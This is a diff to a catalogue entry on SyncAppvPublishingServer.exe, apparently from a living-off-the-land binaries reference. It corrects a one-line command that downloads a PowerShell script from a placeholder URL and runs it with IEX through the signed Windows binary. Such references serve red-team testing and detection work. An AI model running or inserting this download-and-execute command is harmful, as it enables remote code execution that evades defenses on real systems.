@@ -1,7 +1,7 @@
 ## Syncappvpublishingserver.exe
 ```
 
-SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString("http://some.url/script.ps1") | IEX
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
 Execute powershell code from URL
 ```
 * Windows binary: True   
